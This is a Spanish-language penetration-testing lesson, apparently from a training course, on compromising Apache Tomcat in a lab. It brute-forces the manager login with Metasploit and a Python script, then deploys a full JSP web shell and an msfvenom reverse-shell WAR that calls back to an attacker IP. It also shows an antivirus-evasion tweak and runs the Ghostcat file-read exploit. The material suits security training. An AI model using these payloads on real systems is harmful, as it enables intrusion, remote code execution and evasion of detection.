Hemos identificado que efectivamente hay un host Tomcat expuesto externamente por nuestro cliente. Dado que el alcance de la evaluación es relativamente pequeño y todos los demás objetivos no son particularmente interesantes, centremos toda nuestra atención en intentar obtener acceso interno a través de Tomcat.

Como se discutió en la sección anterior, si podemos acceder a los endpoints `/manager` o `/host-manager`, probablemente podremos lograr la ejecución remota de código en el servidor Tomcat. Comencemos por hacer fuerza bruta en la página del administrador de Tomcat en la instancia de Tomcat en `http://web01.inlanefreight.local:8180`. Podemos usar el módulo de Metasploit [auxiliary/scanner/http/tomcat_mgr_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login/) para estos fines, Burp Suite Intruder o cualquier número de scripts para lograr esto. Utilizaremos Metasploit para nuestros propósitos.

---

## Tomcat Manager - Fuerza Bruta de Login

Primero tenemos que configurar algunas opciones. Nuevamente, debemos especificar el vhost y la dirección IP del objetivo para interactuar correctamente con el objetivo. También debemos establecer `STOP_ON_SUCCESS` en `true` para que el escáner se detenga cuando obtengamos un inicio de sesión exitoso, no tiene sentido generar un montón de solicitudes adicionales después de un inicio de sesión exitoso.

```r
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```

Como siempre, verificamos que todo esté configurado correctamente con `show options`.

```r
msf6 auxiliary(scanner/http/tomcat_mgr_login) > show options

Module options (auxiliary/scanner/http/tomcat_mgr_login):

   Name              Current Setting                                                                 Required  Description
   ----              ---------------                                                                 --------  -----------
   BLANK_PASSWORDS   false                                                                           no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                               yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                                           no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                           no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                           no        Add all users in the current database to the list
   PASSWORD                                                                                          no        The HTTP password to specify for authentication
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt      no        File containing passwords, one per line
   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            10.129.201.58                                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             8180                                                                            yes       The target port (TCP)
   SSL               false                                                                           no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   true                                                                            yes       Stop guessing when a credential works for a host
   TARGETURI         /manager/html                                                                   yes       URI for Manager login. Default is /manager/html
   THREADS           1                                                                               yes       The number of concurrent threads (max one per host)
   USERNAME                                                                                          no        The HTTP username to specify for authentication
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                                           no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line
   VERBOSE           true                                                                            yes       Whether to print output for all attempts
   VHOST             web01.inlanefreight.local                                                       no        HTTP server virtual host
```

Ejecutamos `run` y obtenemos una coincidencia para el par de credenciales `tomcat:admin`.

```r
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: root:vagrant (Incorrect)
[+] 10.129.201.58:8180 - Login Successful: tomcat:admin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Es importante notar que existen muchas herramientas disponibles para nosotros como pentesters. Muchas existen para hacer nuestro trabajo más eficiente, especialmente porque la mayoría de las pruebas de penetración tienen un "time-boxed" o están bajo estrictas limitaciones de tiempo. Ninguna herramienta es mejor que otra, y no nos hace un "mal" pentester si usamos ciertas herramientas como Metasploit a nuestro favor. Siempre y cuando entendamos cada escáner y script de explotación que ejecutamos y los riesgos, entonces utilizar este escáner correctamente no es diferente de usar Burp Intruder o escribir un script en Python personalizado. Algunos dicen: "trabaja más inteligentemente, no más duro". ¿Por qué nos haríamos trabajo extra durante una evaluación de 40 horas con 1,500 hosts en el alcance cuando podemos usar una herramienta específica para ayudarnos? Es vital que entendamos *cómo* funcionan nuestras herramientas y cómo hacer muchas cosas manualmente. Podríamos intentar manualmente cada par de credenciales en el navegador o escribir esto usando `cURL` o Python si así lo elegimos. Como mínimo, si decidimos usar una herramienta específica, deberíamos ser capaces de explicar su uso e impacto potencial a nuestros clientes si nos preguntan durante o después de la evaluación.

Digamos que un módulo particular de Metasploit (u otra herramienta) está fallando o no se comporta de la manera que creemos que debería. Siempre podemos usar Burp Suite o ZAP para proxear el tráfico y solucionar problemas. Para hacer esto, primero, inicia Burp Suite y luego establece la opción `PROXIES` de la siguiente manera:

```r
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set PROXIES HTTP:127.0.0

.1:8080

PROXIES => HTTP:127.0.0.1:8080

msf6 auxiliary(scanner/http/tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:admin (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:manager (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:root (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 10.129.201.58:8180 - LOGIN FAILED: role1:admin (Incorrect)
```

Podemos ver en Burp exactamente cómo está funcionando el escáner, teniendo en cuenta cada par de credenciales y la codificación base64 para la autenticación básica que usa Tomcat.

![image](https://academy.hackthebox.com/storage/modules/113/burp_tomcat.png)

Una verificación rápida del valor en el encabezado `Authorization` para una solicitud muestra que el escáner está funcionando correctamente, codificando en base64 las credenciales `admin:vagrant` de la misma manera que lo haría la aplicación Tomcat cuando un usuario intenta iniciar sesión directamente desde la aplicación web. Prueba esto para algunos ejemplos a lo largo de este módulo para empezar a familiarizarte con la depuración a través de un proxy.

```r
echo YWRtaW46dmFncmFudA== |base64 -d

admin:vagrant
```

También podemos usar [este](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce) script en Python para lograr el mismo resultado.

```r
#!/usr/bin/python

import requests
from termcolor import cprint
import argparse

parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")

parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")

args = parser.parse_args()

url = args.url
uri = args.path
users_file = args.usernames
passwords_file = args.passwords

new_url = url + uri
f_users = open(users_file, "rb")
f_pass = open(passwords_file, "rb")
usernames = [x.strip() for x in f_users]
passwords = [x.strip() for x in f_pass]

cprint("\n[+] Atacking.....", "red", attrs = ['bold'])

for u in usernames:
    for p in passwords:
        r = requests.get(new_url,auth = (u, p))

        if r.status_code == 200:
            cprint("\n[+] Success!!", "green", attrs = ['bold'])
            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
            break
    if r.status_code == 200:
        break

if r.status_code != 200:
    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
#print r.status_code
```

Este es un script muy sencillo que toma algunos argumentos. Podemos ejecutar el script con `-h` para ver qué necesita para ejecutarse.

```r
python3 mgr_brute.py  -h

usage: mgr_brute.py [-h] -U URL -P PATH -u USERNAMES -p PASSWORDS

Tomcat manager or host-manager credential bruteforcing

optional arguments:
  -h, --help            show this help message and exit
  -U URL, --url URL     URL to tomcat page
  -P PATH, --path PATH  manager or host-manager URI
  -u USERNAMES, --usernames USERNAMES
                        Users File
  -p PASSWORDS, --passwords PASSWORDS
                        Passwords Files
```

Podemos probar el script con los usuarios y contraseñas predeterminados de Tomcat que utiliza el módulo de Metasploit anterior. Lo ejecutamos y obtenemos un acierto.

```r
python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt

[+] Atacking.....

[+] Success!!
[+] Username : b'tomcat'
[+] Password : b'admin'
```

Si estás interesado en la creación de scripts, revisa los módulos [Introduction to Python 3](https://academy.hackthebox.com/course/preview/introduction-to-python-3) y [Introduction to Bash Scripting](https://academy.hackthebox.com/course/preview/introduction-to-bash-scripting). Un ejercicio interesante sería crear nuestros propios scripts de fuerza bruta para el login de Tomcat Manager usando Python y Bash, pero dejaremos ese ejercicio para ti.

---

## Tomcat Manager - Carga de Archivo WAR

Muchas instalaciones de Tomcat proporcionan una interfaz GUI para gestionar la aplicación. Esta interfaz está disponible en `/manager/html` por defecto, a la que solo pueden acceder los usuarios asignados al rol `manager-gui`. Las credenciales válidas de manager pueden usarse para cargar una aplicación empaquetada de Tomcat (.WAR) y comprometer la aplicación. Un WAR, o Web Application Archive, se usa para implementar rápidamente aplicaciones web y para almacenamiento de respaldo.

Después de realizar un ataque de fuerza bruta y responder a las preguntas 1 y 2 a continuación, navega a `http://web01.inlanefreight.local:8180/manager/html` e ingresa las credenciales.

![](https://academy.hackthebox.com/storage/modules/113/tomcat_mgr.png)

La aplicación web del manager nos permite desplegar instantáneamente nuevas aplicaciones cargando archivos WAR. Un archivo WAR puede crearse usando la utilidad zip. Un web shell JSP como [este](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp) puede descargarse y colocarse dentro del archivo.

```r
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```

```r
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp 

  adding: cmd.jsp (deflated 81%)
```

Haz clic en `Browse` para seleccionar el archivo .war y luego haz clic en `Deploy`.

![image](https://academy.hackthebox.com/storage/modules/113/mgr_deploy.png)

Este archivo se carga en la GUI del manager, después de lo cual la aplicación `/backup` se añadirá a la tabla.

![](https://academy.hackthebox.com/storage/modules/113/war_deployed.png)

Si hacemos clic en `backup`, seremos redirigidos a `http://web01.inlanefreight.local:8180/backup/` y obtendremos un

 error `404 Not Found`. Necesitamos especificar también el archivo `cmd.jsp` en la URL. Navegar a `http://web01.inlanefreight.local:8180/backup/cmd.jsp` nos presentará un web shell que podemos usar para ejecutar comandos en el servidor Tomcat. Desde aquí, podríamos actualizar nuestro web shell a un shell reverso interactivo y continuar. Como en ejemplos anteriores, podemos interactuar con este web shell a través del navegador o usando `cURL` en la línea de comandos. ¡Prueba ambos!

```r
curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id

<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
Command: id<BR>
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)

</pre>
</BODY></HTML>
```

Para limpiar después de nosotros, podemos volver a la página principal del Tomcat Manager y hacer clic en el botón `Undeploy` junto a la aplicación `backup` después, por supuesto, de anotar el archivo y la ubicación de la carga para nuestro informe, que en nuestro ejemplo es `/opt/tomcat/apache-tomcat-10.0.10/webapps`. Si hacemos un `ls` en ese directorio desde nuestro web shell, veremos el archivo `backup.war` cargado y el directorio `backup` que contiene el script `cmd.jsp` y `META-INF` creado después de que la aplicación se despliegue. Hacer clic en `Undeploy` generalmente eliminará el archivo WAR cargado y el directorio asociado con la aplicación.

También podríamos usar `msfvenom` para generar un archivo WAR malicioso. El payload [java/jsp_shell_reverse_tcp](https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/payloads/singles/java/jsp_shell_reverse_tcp.rb) ejecutará un shell reverso a través de un archivo JSP. Navega a la consola de Tomcat y despliega este archivo. Tomcat extraerá automáticamente el contenido del archivo WAR y lo desplegará.

```r
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

Payload size: 1098 bytes
Final size of war file: 1098 bytes
```

Inicia un listener de Netcat y haz clic en `/backup` para ejecutar el shell.

```r
nc -lnvp 4443

listening on [any] 4443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.201.58] 45224

id

uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

El módulo de Metasploit [multi/http/tomcat_mgr_upload](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/) se puede usar para automatizar el proceso mostrado arriba, pero dejaremos esto como un ejercicio para el lector.

[Este](https://github.com/SecurityRiskAdvisors/cmd.jsp) web shell JSP es muy ligero (menos de 1 kb) y utiliza un [Bookmarklet](https://www.freecodecamp.org/news/what-are-bookmarklets/) o marcador del navegador para ejecutar el JavaScript necesario para la funcionalidad del web shell y la interfaz de usuario. Sin él, navegar a un `cmd.jsp` cargado no renderizaría nada. Esta es una excelente opción para minimizar nuestra huella y posiblemente evadir las detecciones de los web shells JSP estándar (aunque es posible que sea necesario modificar un poco el código JSP).

El web shell tal como está solo es detectado por 2/58 proveedores de antivirus.

![image](https://academy.hackthebox.com/storage/modules/113/vt2.png)

Un cambio simple como cambiar:

```r
FileOutputStream(f);stream.write(m);o="Uploaded:
```

a:

```r
FileOutputStream(f);stream.write(m);o="uPlOaDeD:
```

resulta en 0/58 proveedores de seguridad marcando el archivo `cmd.jsp` como malicioso al momento de escribir esto.

---

## Una Nota Rápida sobre Web shells

Cuando subimos web shells (especialmente en externos), queremos prevenir el acceso no autorizado. Debemos tomar ciertas medidas como un nombre de archivo aleatorio (es decir, hash MD5), limitar el acceso a nuestra dirección IP de origen e incluso protegerlo con contraseña. No queremos que un atacante encuentre nuestro web shell y lo utilice para obtener su propio punto de apoyo.

---

## CVE-2020-1938: Ghostcat

Se descubrió que Tomcat era vulnerable a un LFI no autenticado en un descubrimiento semi-reciente llamado [Ghostcat](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938). Todas las versiones de Tomcat antes de 9.0.31, 8.5.51 y 7.0.100 eran vulnerables. Esta vulnerabilidad fue causada por una mala configuración en el protocolo AJP utilizado por Tomcat. AJP significa Apache Jserv Protocol, que es un protocolo binario utilizado para proxiacionar solicitudes. Esto se utiliza típicamente en la proxiación de solicitudes a servidores de aplicaciones detrás de los servidores web frontales.

El servicio AJP generalmente se ejecuta en el puerto 8009 en un servidor Tomcat. Esto se puede verificar con un escaneo dirigido de Nmap.

```r
nmap -sV -p 8009,8080 app-dev.inlanefreight.local

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 20:05 EDT
Nmap scan report for app-dev.inlanefreight.local (10.129.201.58)
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.36 seconds
```

El escaneo anterior confirma que los puertos 8080 y 8009 están abiertos. El código PoC para la vulnerabilidad se puede encontrar [aquí](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi). Descarga el script y guárdalo localmente. El exploit solo puede leer archivos y carpetas dentro de la carpeta web apps, lo que significa que archivos como `/etc/passwd` no se pueden acceder. Intentemos acceder al archivo web.xml.

```r
python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 

Getting resource at ajp13://app-dev.inlanefreight.local:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

</web-app>
```

En algunas instalaciones de Tomcat, podríamos acceder a datos sensibles dentro del archivo WEB-INF.

---

## Continuando

Tomcat siempre es un gran hallazgo en pruebas de penetración internas y externas. Siempre que lo encontremos, debemos probar el área del Tomcat Manager para ver si tiene credenciales débiles/predeterminadas. Si podemos iniciar sesión, podemos convertir rápidamente este acceso en ejecución remota de código. Es común encontrar Tomcat ejecutándose como usuarios de alto privilegio, como SYSTEM o root, por lo que siempre vale la pena investigarlo, ya que podría proporcionarnos un punto de apoyo privilegiado en un servidor Linux o en un servidor Windows unido a un dominio en un entorno de Active Directory.

---